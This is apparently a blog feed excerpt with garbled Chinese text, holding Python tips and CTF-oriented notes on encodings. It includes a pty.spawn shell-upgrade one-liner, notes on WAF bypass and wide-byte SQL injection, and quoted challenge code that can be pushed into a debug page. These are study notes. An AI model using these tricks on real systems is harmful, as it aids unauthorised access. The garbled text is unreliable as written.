        <content type="html"><![CDATA[<h3 id="è¾“å‡ºåˆ—è¡¨å…ƒç´ "><a href="#è¾“å‡ºåˆ—è¡¨å…ƒç´ " class="headerlink" title="è¾“å‡ºåˆ—è¡¨å…ƒç´ "></a>è¾“å‡ºåˆ—è¡¨å…ƒç´ </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(lis[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(*lis[<span class="number">1</span>:])</span><br><span class="line">&gt;&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•"><a href="#åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•" class="headerlink" title="åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•"></a>åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(lis):</span><br><span class="line"><span class="built_in">print</span>(index,i)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ ¼å¼åŒ–"><a href="#å­—ç¬¦ä¸²æ ¼å¼åŒ–" class="headerlink" title="å­—ç¬¦ä¸²æ ¼å¼åŒ–"></a>å­—ç¬¦ä¸²æ ¼å¼åŒ–</h3><ul><li><p>ç±»ä¼¼cè¯­è¨€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %s å­—ç¬¦ä¸²å ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span>%<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"><span class="comment"># %c å­—ç¬¦å ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>%<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>format   (ä¼šè‡ªåŠ¨å°†å˜é‡è½¬ä¸ºstr)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><blockquote><p>å ä½ç¬¦æ ¼å¼åŒ–<a href="https://blog.csdn.net/u014770372/article/details/76021988">https://blog.csdn.net/u014770372/article/details/76021988</a></p></blockquote></li></ul><h3 id="äº¤æ¢æ•°å€¼"><a href="#äº¤æ¢æ•°å€¼" class="headerlink" title="äº¤æ¢æ•°å€¼"></a>äº¤æ¢æ•°å€¼</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">a,b=b,a</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">&gt;&gt;<span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="æ¨å¯¼å¼"><a href="#æ¨å¯¼å¼" class="headerlink" title="æ¨å¯¼å¼"></a>æ¨å¯¼å¼</h3><blockquote><p>[æƒ³å¾—åˆ°çš„å˜é‡å½¢å¼ for å˜é‡ in å¯è¿­ä»£å¯¹è±¡ if æ¡ä»¶è¡¨è¾¾å¼]</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ‰¾å‡ºåˆ—è¡¨é‡Œå¤§äº0çš„æ•°</span></span><br><span class="line">shu=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> shu <span class="keyword">if</span> i&gt;<span class="number">0</span>])</span><br><span class="line">&gt;&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç»Ÿè®¡ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">m = <span class="string">&#x27;I am Khazking!&#x27;</span></span><br><span class="line">n = &#123;i:m.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> m&#125;</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">&gt;&gt;&#123;<span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;K&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;!&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ›¿æ¢"><a href="#å­—ç¬¦ä¸²æ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²æ›¿æ¢"></a>å­—ç¬¦ä¸²æ›¿æ¢</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#repalceæ–¹æ³•åªèƒ½å®ç°å…ƒç´ ä¸€å¯¹ä¸€æ›¿æ¢</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨ä¸‹è¿°æ–¹æ³•å¯ä»¥å®ç°bæ›¿æ¢ä¸ºz,zæ›¿æ¢ä¸ºb</span></span><br><span class="line"><span class="comment">#å»ºç«‹æ˜ å°„å…³ç³»å­—å…¸</span></span><br><span class="line">a=<span class="string">&#x27;zbbz&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(<span class="string">&#x27;bz&#x27;</span>,<span class="string">&#x27;zb&#x27;</span>)<span class="comment">#ç­‰ä»·äº table= &#123;&#x27;b&#x27;:&#x27;z&#x27;,&#x27;z&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">a = a.translate(table)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt;bzzb</span><br></pre></td></tr></table></figure><h3 id="å„ç§æ’åº"><a href="#å„ç§æ’åº" class="headerlink" title="å„ç§æ’åº"></a>å„ç§æ’åº</h3><p><code>reverse=True</code>é™åºï¼Œé»˜è®¤ä¸ºå‡åº</p><ul><li><p>å­—å…¸æ’åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‰é”®å€¼æ’åº</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æŒ‰é”®åæ’åº</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>åµŒå¥—æ’åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å­—å…¸åµŒå¥—</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>], <span class="string">&#x27;c&#x27;</span>: [<span class="number">3</span>, <span class="number">4</span>], <span class="string">&#x27;b&#x27;</span>: [<span class="number">0</span>, <span class="number">2</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">2</span>, <span class="number">1</span>]&#125;</span><br><span class="line"><span class="built_in">sorted</span>(dic.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>][<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># æŒ‰é”®å€¼ï¼ˆåˆ—è¡¨ï¼‰çš„ç¬¬äºŒä¸ªå…ƒç´ æ’åˆ—</span></span><br><span class="line"><span class="comment"># åˆ—è¡¨åµŒå¥—</span></span><br><span class="line">[[<span class="string">&#x27;é‡‘ç‰›&#x27;</span>, <span class="number">89000</span>, <span class="number">13140.196950444726</span>, <span class="number">2800</span>, <span class="number">1574</span>], [<span class="string">&#x27;é”¦æ±Ÿ&#x27;</span>, <span class="number">113800</span>, <span class="number">18719.342387419587</span>, <span class="number">2550</span>, <span class="number">1399</span>], [<span class="string">&#x27;æˆå&#x27;</span>, <span class="number">96400</span>, <span class="number">14034.861538461539</span>, <span class="number">2300</span>, <span class="number">1300</span>], [<span class="string">&#x27;é«˜æ–°&#x27;</span>, <span class="number">160000</span>, </span><br><span class="line"><span class="number">23663.31254871395</span>, <span class="number">3600</span>, <span class="number">1283</span>], [<span class="string">&#x27;æ­¦ä¾¯&#x27;</span>, <span class="number">102000</span>, <span class="number">19768.739789964995</span>, <span class="number">3100</span>, <span class="number">857</span>]]</span><br><span class="line"><span class="built_in">sorted</span>(lis, key = <span class="keyword">lambda</span> k : k[<span class="number">2</span>],reverse= <span class="literal">True</span>) <span class="comment"># æŒ‰æ¯ä¸ªå­åˆ—è¡¨çš„ç¬¬ä¸‰ä¸ªå…ƒç´ æ’åˆ—</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¿®æ”¹ä¸‹æ ‡å³å¯æŒ‰ç…§å…¶ä»–å…ƒç´ è¿›è¡Œæ’åˆ—ã€‚</p><h3 id="ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡"><a href="#ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡" class="headerlink" title="ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡"></a>ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">dict</span>.fromkeys(data,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s[i]+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#ç»Ÿè®¡sä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸‰ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span> (Counter(s).most_common(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ "><a href="#ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ " class="headerlink" title="ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ "></a>ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="comment">#filter(function, iterable)</span></span><br><span class="line">data = [randint(-<span class="number">10</span>,<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x&gt;=<span class="number">0</span>,data))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…åˆ—è¡¨æ¨å¯¼å¼</span></span><br></pre></td></tr></table></figure><h3 id="ä¸´æ—¶æ–‡ä»¶"><a href="#ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶"></a>ä¸´æ—¶æ–‡ä»¶</h3><blockquote><p>æˆ‘ä»¬é‡‡é›†æ•°æ®è¿›è¡Œåˆ†æï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ä¿å­˜ç»“æœï¼Œæˆ‘ä»¬é‡‡é›†çš„æ•°æ®å¦‚æœå¸¸é©»å†…å­˜å°±ä¼šè®©ç”µè„‘å´©æºƒï¼Œäºæ˜¯æˆ‘ä»¬å°†è¿™ä¸ªæ•°æ®æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼ˆå¤–éƒ¨å­˜å‚¨ï¼‰ï¼Œåœ¨æ–‡ä»¶å…³é—­åå°†è¢«åˆ é™¤</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> TemporaryFile,NamedTemporaryFile</span><br><span class="line">f = TemporaryFile()</span><br><span class="line">f.write(<span class="string">b&#x27;abc&#x27;</span>*<span class="number">10000</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">a=f.read(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªèƒ½åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ç”¨NamedTemporaryFile</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nte = NamedTemporaryFile(delete=false)<span class="comment">#deleteå‚æ•°ä¸ºfalseæ—¶ç¨‹åºè¿è¡Œå®Œï¼Œä¸´æ—¶æ–‡ä»¶ä¹Ÿä¸ä¼šè¢«åˆ é™¤</span></span><br><span class="line"><span class="built_in">print</span>(nte.name)</span><br></pre></td></tr></table></figure><h3 id="ç©·ä¸¾ç»„åˆ"><a href="#ç©·ä¸¾ç»„åˆ" class="headerlink" title="ç©·ä¸¾ç»„åˆ"></a>ç©·ä¸¾ç»„åˆ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å…¨æ’åˆ—  </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="comment">#permutations()è¿”å›çš„æ˜¯tupleç±»å‹ï¼Œæ‰€è¦è¦ç”¨&#x27;&#x27;.join(i)è¿æ¥èµ·æ¥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(<span class="string">&#x27;123&#x27;</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(i),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ‹Ÿç»ˆç«¯"><a href="#æ¨¡æ‹Ÿç»ˆç«¯" class="headerlink" title="æ¨¡æ‹Ÿç»ˆç«¯"></a>æ¨¡æ‹Ÿç»ˆç«¯</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹"></a>äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memory_map</span>(<span class="params">filename, access=mmap.ACCESS_WRITE</span>):</span><br><span class="line">    size = os.path.getsize(filename)</span><br><span class="line">    fd = os.<span class="built_in">open</span>(filename, os.O_RDWR)</span><br><span class="line">    <span class="keyword">return</span> mmap.mmap(fd, size, access=access)</span><br><span class="line">m = memory_map(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(m)</span><br><span class="line"><span class="number">1000000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="è„šæœ¬å‚æ•°"><a href="#è„šæœ¬å‚æ•°" class="headerlink" title="è„šæœ¬å‚æ•°"></a>è„šæœ¬å‚æ•°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]â†’xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]â†’aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¼–ç </title>
      <link href="/2023/05/01/%E7%BC%96%E7%A0%81/"/>
      <url>/2023/05/01/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¼–ç çš„ç”±æ¥"><a href="#ç¼–ç çš„ç”±æ¥" class="headerlink" title="ç¼–ç çš„ç”±æ¥"></a>ç¼–ç çš„ç”±æ¥</h2><p>è®¡ç®—æœºå­˜å‚¨çš„ä»»ä½•æ•°æ®ï¼ŒåŒ…æ‹¬å„ç§æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³è§†é¢‘æ–‡ä»¶ç­‰ç­‰ï¼Œå®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸²<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">äºŒè¿›åˆ¶</a>æ•°å­—01å­—èŠ‚åºåˆ—ç»„æˆçš„ã€‚</p><p>å­—èŠ‚ä¸€èˆ¬ç”¨æ¥å­˜å‚¨ä¸ç½‘ç»œä¼ è¾“ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´ä¸ç½‘ç»œä¼ è¾“å¸¦å®½ã€‚è€Œå­—ç¬¦ä¸»è¦æ˜¯ç”¨äºæ˜¾ç¤ºï¼Œæ–¹ä¾¿å¤§å®¶é˜…è¯»ã€‚</p><p>ç¼–ç ä¸»è¦æ˜¯ä¸ºäº†å­˜å‚¨ä¼ è¾“ï¼Œè€Œè§£ç æ˜¯ä¸ºäº†æ–¹ä¾¿é˜…è¯»</p><h2 id="ç¼–ç æ–¹å¼çš„ç¡®ç«‹"><a href="#ç¼–ç æ–¹å¼çš„ç¡®ç«‹" class="headerlink" title="ç¼–ç æ–¹å¼çš„ç¡®ç«‹"></a>ç¼–ç æ–¹å¼çš„ç¡®ç«‹</h2><p>å¯ä»¥é€šè¿‡httpæ¶ˆæ¯å¤´çš„accept-encodingæŒ‡å®š</p><p>htmlä¸­çš„charset&#x3D;â€UTF-8â€³</p><p>åº”ç”¨æœ¬èº«çš„ç¼–ç æ–¹å¼</p><h2 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h2><p>ç¼–ç è¡¨</p><blockquote><p>å¤§å°å†™å­—æ¯ï¼Œ[0,9]ï¼Œ+ï¼Œ&#x2F;</p></blockquote><p>åŠ å¯†</p><blockquote><p>æ¯6ä¸ªå­—ç¬¦ä¸ºä¸€ç»„</p></blockquote><p>è§£å¯†</p><blockquote><p>æ¯8ä¸ªå­—ç¬¦ä¸ºä¸€ç»„</p></blockquote><p>åŠ å¯†æ—¶ä¸è¶³çš„ä¼šè¡¥ä¸Š<code>=</code></p><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><p>æ˜&#x2F;å¯†æ–‡ç©ºé—´ï¼šå­—æ¯è¡¨</p><p>æ“ä½œï¼šå³ç§»13ä½</p><p>å¯é€†è¿ç®—</p><h2 id="urlç¼–ç "><a href="#urlç¼–ç " class="headerlink" title="urlç¼–ç "></a>urlç¼–ç </h2><p><a href="https://blog.csdn.net/freeking101/article/details/68922983">URLåŸç†ã€URLç¼–ç ã€URLç‰¹æ®Šå­—ç¬¦</a></p><h4 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h4><p><a href="https://www.cnblogs.com/zuge/p/6141359.html">URLä¸­çš„ä¿ç•™å’Œä¸å®‰å…¨å­—ç¬¦ - atzuge - åšå®¢å›­</a></p><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><h4 id="åœ¨å“ªé‡Œå‘ç”Ÿ"><a href="#åœ¨å“ªé‡Œå‘ç”Ÿ" class="headerlink" title="åœ¨å“ªé‡Œå‘ç”Ÿ"></a>åœ¨å“ªé‡Œå‘ç”Ÿ</h4><p>å½“æˆ‘ä»¬å‘æœåŠ¡å™¨å‘é€æ•°æ®æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨å°†éœ€è¦ç¼–ç çš„å­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼ˆå¯ä»¥åœ¨æ•°æ®åŒ…ä¸­çœ‹åˆ°ï¼‰,ç„¶åæœåŠ¡å™¨æ¥æ”¶åˆ°æ•°æ®åŒ…åï¼Œä¹Ÿä¼šè‡ªåŠ¨è§£ç URLç¼–ç åçš„å­—ç¬¦ã€‚</p><h2 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h2><p>é•¿åº¦ï¼šå›ºå®š1å­—èŠ‚</p><p>0~126ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­å‰32ä¸ªå­—ç¬¦ä¸ºä¸å¯æ‰“å°å­—ç¬¦</p><h2 id="Unicodeå­—ç¬¦é›†â€“ä¸‡å›½ç "><a href="#Unicodeå­—ç¬¦é›†â€“ä¸‡å›½ç " class="headerlink" title="Unicodeå­—ç¬¦é›†â€“ä¸‡å›½ç "></a>Unicodeå­—ç¬¦é›†â€“ä¸‡å›½ç </h2><p>å½¢å¼ï¼šU+æ•°å­—  æˆ–è€… 16è¿›åˆ¶å½¢å¼\u8fd9\u662f\u4e00</p><p>é•¿åº¦ï¼šå›ºå®š<strong>2å­—èŠ‚</strong></p><p><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p><p><img src="/../images/image-20220624223033281.png" alt="image-20220624223033281"></p><h3 id="UTF"><a href="#UTF" class="headerlink" title="UTF"></a>UTF</h3><p>UTFæ˜¯Unicode Transformation Format(ç»Ÿä¸€ç è½¬æ¢æ ¼å¼)ï¼Œå˜é•¿Unicodeç¼–ç ã€‚</p><p>å¸¸è§çš„æœ‰UTF-8,UTF-16,UTF-32</p><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><p><a href="https://blog.csdn.net/qq_36539075/article/details/79946099">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><h2 id="HTMLå®ä½“ç¼–ç "><a href="#HTMLå®ä½“ç¼–ç " class="headerlink" title="HTMLå®ä½“ç¼–ç "></a>HTMLå®ä½“ç¼–ç </h2><p>&amp;#36825</p><h2 id="ç¼–ç å®‰å…¨"><a href="#ç¼–ç å®‰å…¨" class="headerlink" title="ç¼–ç å®‰å…¨"></a>ç¼–ç å®‰å…¨</h2><h3 id="base64ç¼–ç ç»•è¿‡"><a href="#base64ç¼–ç ç»•è¿‡" class="headerlink" title="base64ç¼–ç ç»•è¿‡"></a>base64ç¼–ç ç»•è¿‡</h3><p><a href="https://forum.butian.net/share/639">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-ä»RFCçœ‹å¦‚ä½•ä½¿ç”¨Base64ç¼–ç ç»•è¿‡WAF</a></p><h3 id="ç¼–ç å‰åä¸ä¸€è‡´"><a href="#ç¼–ç å‰åä¸ä¸€è‡´" class="headerlink" title="ç¼–ç å‰åä¸ä¸€è‡´"></a>ç¼–ç å‰åä¸ä¸€è‡´</h3><ul><li><p>SQLå®½å­—èŠ‚æ³¨å…¥</p></li><li><p>æ–‡ä»¶ç¼–ç ä¸åŒï¼Œå¯¼è‡´æŠ¥é”™</p><p>[NSSRound#6 Team]check(Revenge)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure><p><code>with open(filepath, &#39;r&#39;) as f</code>ï¼Œè¿™é‡Œmodeä¸ºrï¼Œé»˜è®¤ä¸ºutf-8ç¼–ç ã€‚</p><p>æ‰€ä»¥å½“æˆ‘ä»¬å°†gbkç¼–ç çš„æ–‡ä»¶ä¸Šä¼ åï¼Œè¯»å–æ—¶å°±ä¼šæŠ¥é”™ï¼Œä»è€Œå‡ºç°debugç•Œé¢</p><p><img src="/../images/image-20221021205739631.png" 